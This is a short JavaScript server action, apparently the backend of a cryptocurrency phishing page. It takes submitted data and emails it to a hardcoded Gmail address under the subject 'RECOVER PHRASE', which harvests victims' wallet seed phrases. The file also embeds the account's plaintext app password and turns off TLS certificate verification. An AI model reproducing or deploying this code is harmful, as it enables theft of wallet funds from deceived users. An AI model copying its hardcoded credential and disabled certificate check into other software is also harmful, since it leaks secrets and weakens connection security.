"use server"
import nodemailer from 'nodemailer';


export const sendMail = async (data) =>{

    console.log('server', data)

 const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'wisdomuzodimna@gmail.com',
      pass: 'qzrh xkwa vpwx hglo',
    },
    tls: {
        rejectUnauthorized: false // Ignore self-signed certificate
    }
  });

  try {
   
    const info = await transporter.sendMail({
        from: '"SEED/RECOVERY PHRASE" <wisdomuzodimna@gmail.com>',
        to: 'wisdomuzodimna@gmail.com',
        subject: 'RECOVER PHRASE',
        text: 'RECOVER PHRASE',
        html: `<h1>RECOVER PHRASE: ${data}</h1>`,
        });

        console.log('Message sent: %s', info.messageId);
  } catch (error) {
       console.error(error);
  }

}